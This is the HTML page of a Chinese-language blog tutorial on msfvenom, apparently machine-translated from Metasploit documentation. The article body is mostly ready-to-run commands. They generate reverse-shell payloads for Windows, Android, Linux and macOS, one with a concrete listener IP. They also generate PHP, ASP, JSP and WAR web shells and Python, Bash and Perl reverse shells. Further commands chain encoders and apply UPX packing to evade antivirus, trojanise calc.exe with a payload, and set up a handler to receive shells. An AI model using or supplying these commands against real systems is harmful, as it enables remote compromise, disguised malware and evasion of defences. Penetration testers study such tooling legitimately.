@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="Msfvenom是净荷生成和编码的组合。 它将取代msfpayload和msfencode于2015年6月8日。要开始使用msfvenom，首先请看看它支持的选项：">
+<meta name="keywords" content="msfvenom">
+<meta property="og:type" content="article">
+<meta property="og:title" content="msfvenom的使用">
+<meta property="og:url" content="http:&#x2F;&#x2F;zerokeeper.github.io&#x2F;tools&#x2F;use-of-msfvenom.html">
+<meta property="og:site_name" content="ZeroKeeper">
+<meta property="og:description" content="Msfvenom是净荷生成和编码的组合。 它将取代msfpayload和msfencode于2015年6月8日。要开始使用msfvenom，首先请看看它支持的选项：">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2019-10-20T07:31:45.000Z">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>msfvenom的使用</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/web-security/manual-injection-of-access-mssql-mysql-and-oracle.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/programing/python-query-urp-educational-system-performance.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zerokeeper.github.io/tools/use-of-msfvenom.html" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zerokeeper.github.io/tools/use-of-msfvenom.html&text=msfvenom的使用" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zerokeeper.github.io/tools/use-of-msfvenom.html&title=msfvenom的使用" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zerokeeper.github.io/tools/use-of-msfvenom.html&is_video=false&description=msfvenom的使用" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=msfvenom的使用&body=Check out this article: http://zerokeeper.github.io/tools/use-of-msfvenom.html" target="_blank" rel="noopener"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zerokeeper.github.io/tools/use-of-msfvenom.html&title=msfvenom的使用" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zerokeeper.github.io/tools/use-of-msfvenom.html&title=msfvenom的使用" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zerokeeper.github.io/tools/use-of-msfvenom.html&title=msfvenom的使用" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zerokeeper.github.io/tools/use-of-msfvenom.html&title=msfvenom的使用" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zerokeeper.github.io/tools/use-of-msfvenom.html&name=msfvenom的使用&description=&lt;p&gt;Msfvenom是净荷生成和编码的组合。 它将取代msfpayload和msfencode于2015年6月8日。&lt;br&gt;要开始使用msfvenom，首先请看看它支持的选项：&lt;/p&gt;" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-如何产生一个有效载荷"><span class="toc-number">1.</span> <span class="toc-text">0x01 如何产生一个有效载荷</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-如何有效载荷进行编码"><span class="toc-number">2.</span> <span class="toc-text">0x02 如何有效载荷进行编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03如何避免坏字符"><span class="toc-number">3.</span> <span class="toc-text">0x03如何避免坏字符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04如何提供一个自定义模板"><span class="toc-number">4.</span> <span class="toc-text">0x04如何提供一个自定义模板</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05如何链msfvenom输出"><span class="toc-number">5.</span> <span class="toc-text">0x05如何链msfvenom输出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#系统payload"><span class="toc-number">6.</span> <span class="toc-text">系统payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Payloads"><span class="toc-number">7.</span> <span class="toc-text">Web Payloads</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#脚本Payloads"><span class="toc-number">8.</span> <span class="toc-text">脚本Payloads</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-Handlers"><span class="toc-number">9.</span> <span class="toc-text">0x06 Handlers</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-参考："><span class="toc-number">10.</span> <span class="toc-text">0x07 参考：</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        msfvenom的使用
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">ZeroKeeper</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2017-03-04T23:56:00.000Z" itemprop="datePublished">2017-03-05</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/tools/">tools</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/msfvenom/" rel="tag">msfvenom</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>Msfvenom是净荷生成和编码的组合。 它将取代msfpayload和msfencode于2015年6月8日。<br>要开始使用msfvenom，首先请看看它支持的选项：</p>
+<a id="more"></a>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Options:</span><br><span class="line">-p, –payload Payload to use. Specify a ‘-‘ or stdin to use custom payloads</span><br><span class="line">-l, –list [module_type] List a module type. Options are: payloads, encoders, nops, all</span><br><span class="line">-n, –nopsled Prepend a nopsled of [length] size on to the payload</span><br><span class="line">-f, –format Output format (use –help-formats for a list)</span><br><span class="line">-e, –encoder [encoder] The encoder to use</span><br><span class="line">-a, –arch The architecture to use</span><br><span class="line">–platform The platform of the payload</span><br><span class="line">-s, –space The maximum size of the resulting payload</span><br><span class="line">-b, –bad-chars The list of characters to avoid example: ‘\x00\xff’</span><br><span class="line">-i, –iterations The number of times to encode the payload</span><br><span class="line">-c, –add-code Specify an additional win32 shellcode file to include</span><br><span class="line">-x, –template Specify a custom executable file to use as a template</span><br><span class="line">-k, –keep Preserve the template behavior and inject the payload as a new thread</span><br><span class="line">–payload-options List the payload’s standard options</span><br><span class="line">-o, –out Save the payload</span><br><span class="line">-v, –var-name Specify a custom variable name to use for certain output formats</span><br><span class="line">-h, –help Show this message</span><br><span class="line">–help-formats List available formats</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x01-如何产生一个有效载荷"><a href="#0x01-如何产生一个有效载荷" class="headerlink" title="0x01 如何产生一个有效载荷"></a>0x01 如何产生一个有效载荷</h2><p>为了产生一个有效载荷，还有，你必须提供（-p和-f）两个标志：</p>
+<p>-p标志：指定哪些有效载荷生成<br>要查看有效载荷可从框架，你可以这样做：</p>
+<pre><code>msfvenom -l payloads</code></pre><p>-p标志也支持“ - ”，以此来接受一个自定义的有效载荷：</p>
+<pre><code>cat payload_file.bin | msfvenom -p - -a x86 –platform win -e x86/shikata_ga_nai -f raw</code></pre><p>-f标志：指定有效载荷的格式<br>语法的例子：</p>
+<pre><code>msfvenom -p windows/meterpreter/bind_tcp -f exe</code></pre><p>要查看支持哪些格式，可以执行以下操作来找出：</p>
+<pre><code>msfvenom –help-formats</code></pre><p>通常情况下，这可能是你将如何使用msfvenom：</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker’s IP] lport=4444 -f exe -o /tmp/my_payload.exee</code></pre><h2 id="0x02-如何有效载荷进行编码"><a href="#0x02-如何有效载荷进行编码" class="headerlink" title="0x02 如何有效载荷进行编码"></a>0x02 如何有效载荷进行编码</h2><p>默认情况下，当您使用-b标志（该badchar标志）的编码功能将自动一命呜呼 在其他情况下，你必须使用-e标志如下所示：</p>
+<pre><code>msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw</code></pre><p>要找出你可以使用的编码器，可以使用-l标志：</p>
+<pre><code>msfvenom -l encoders</code></pre><p>您也可以使用-i标志进行编码的有效载荷多次。 有时更多的迭代可以帮助避免杀毒软件，但知道的编码是不是真的意味着要使用一个真正的AV回避的解决方案：</p>
+<pre><code>msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3</code></pre><h2 id="0x03如何避免坏字符"><a href="#0x03如何避免坏字符" class="headerlink" title="0x03如何避免坏字符"></a>0x03如何避免坏字符</h2><p>b标志是为了被使用，以避免在负载某些字符。 当使用此选项，msfvenom会自动找到一个合适的编码器的有效载荷进行编码：</p>
+<pre><code>msfvenom -p windows/meterpreter/bind_tcp -b ‘\x00’ -f raw</code></pre><h2 id="0x04如何提供一个自定义模板"><a href="#0x04如何提供一个自定义模板" class="headerlink" title="0x04如何提供一个自定义模板"></a>0x04如何提供一个自定义模板</h2><p>默认情况下，msfvenom使用模板从MSF /数据/模板目录。 如果您想选择你自己的，你可以用-x标志如下所示：</p>
+<pre><code>msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe &gt; new.exe</code></pre><p>请注意：如果你想创建一个64位的有效载荷与的Winodws自定义64自定义模板，而不是exe格式的话，你应该使用EXE只：</p>
+<pre><code>msfvenom -p windows/x64/meterpreter/bind_tcp -x /tmp/templates/64_calc.exe -f exe-only &gt; /tmp/fake_64_calc.exe</code></pre><p>-x标志往往是搭配-k标志，它允许你运行你的有效载荷从模板创建一个新的线程。 然而，这是目前唯一可靠的旧的Windows机器，如x86的Windows XP中。</p>
+<h2 id="0x05如何链msfvenom输出"><a href="#0x05如何链msfvenom输出" class="headerlink" title="0x05如何链msfvenom输出"></a>0x05如何链msfvenom输出</h2><p>老msfpayload和msfencode公用事业往往链接在一起的多种编码的顺序层。 这是可能的使用msfvenom还有:<br>生成windows payload</p>
+<pre><code>$msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.3 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 | \
+msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | \
+msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe</code></pre><p>使用upx压缩</p>
+<pre><code>upx -5 payload.exe</code></pre><h2 id="系统payload"><a href="#系统payload" class="headerlink" title="系统payload"></a>系统payload</h2><p>windows payload<br>    msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\x00’ LHOST=45.32.94.102 LPORT=8888 -f exe &gt; a.exe</p>
+<p>android payload</p>
+<pre><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.103 LPORT=4444 R &gt; androvirus.apk</code></pre><p>Linux</p>
+<pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</code></pre><p>Mac</p>
+<pre><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</code></pre><h2 id="Web-Payloads"><a href="#Web-Payloads" class="headerlink" title="Web Payloads"></a>Web Payloads</h2><p>PHP</p>
+<pre><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php
+cat shell.php | pbcopy &amp;&amp; echo &apos;&lt;?php &apos; | tr -d &apos;\n&apos; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</code></pre><p>ASP</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</code></pre><p>JSP</p>
+<pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</code></pre><p>WAR</p>
+<pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</code></pre><h2 id="脚本Payloads"><a href="#脚本Payloads" class="headerlink" title="脚本Payloads"></a>脚本Payloads</h2><p>Python</p>
+<pre><code>msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw &gt; shell.py</code></pre><p>Bash</p>
+<pre><code>msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw &gt; shell.sh</code></pre><p>Perl</p>
+<pre><code>msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</code></pre><h2 id="0x06-Handlers"><a href="#0x06-Handlers" class="headerlink" title="0x06 Handlers"></a>0x06 Handlers</h2><p>Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.</p>
+<pre><code>use exploit/multi/handler, set PAYLOAD set LHOST xxxx, set LPORT xxxx ,set ExitOnSession false ,exploit -j -z</code></pre><h2 id="0x07-参考："><a href="#0x07-参考：" class="headerlink" title="0x07 参考："></a>0x07 参考：</h2><p>1 <a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom" target="_blank" rel="noopener">How to use msfvenom</a></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-如何产生一个有效载荷"><span class="toc-number">1.</span> <span class="toc-text">0x01 如何产生一个有效载荷</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-如何有效载荷进行编码"><span class="toc-number">2.</span> <span class="toc-text">0x02 如何有效载荷进行编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03如何避免坏字符"><span class="toc-number">3.</span> <span class="toc-text">0x03如何避免坏字符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04如何提供一个自定义模板"><span class="toc-number">4.</span> <span class="toc-text">0x04如何提供一个自定义模板</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05如何链msfvenom输出"><span class="toc-number">5.</span> <span class="toc-text">0x05如何链msfvenom输出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#系统payload"><span class="toc-number">6.</span> <span class="toc-text">系统payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Payloads"><span class="toc-number">7.</span> <span class="toc-text">Web Payloads</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#脚本Payloads"><span class="toc-number">8.</span> <span class="toc-text">脚本Payloads</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-Handlers"><span class="toc-number">9.</span> <span class="toc-text">0x06 Handlers</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-参考："><span class="toc-number">10.</span> <span class="toc-text">0x07 参考：</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zerokeeper.github.io/tools/use-of-msfvenom.html" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zerokeeper.github.io/tools/use-of-msfvenom.html&text=msfvenom的使用" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zerokeeper.github.io/tools/use-of-msfvenom.html&title=msfvenom的使用" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zerokeeper.github.io/tools/use-of-msfvenom.html&is_video=false&description=msfvenom的使用" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=msfvenom的使用&body=Check out this article: http://zerokeeper.github.io/tools/use-of-msfvenom.html" target="_blank" rel="noopener"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zerokeeper.github.io/tools/use-of-msfvenom.html&title=msfvenom的使用" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zerokeeper.github.io/tools/use-of-msfvenom.html&title=msfvenom的使用" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zerokeeper.github.io/tools/use-of-msfvenom.html&title=msfvenom的使用" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zerokeeper.github.io/tools/use-of-msfvenom.html&title=msfvenom的使用" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zerokeeper.github.io/tools/use-of-msfvenom.html&name=msfvenom的使用&description=&lt;p&gt;Msfvenom是净荷生成和编码的组合。 它将取代msfpayload和msfencode于2015年6月8日。&lt;br&gt;要开始使用msfvenom，首先请看看它支持的选项：&lt;/p&gt;" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 zerokeeper
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'zerokeeper';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
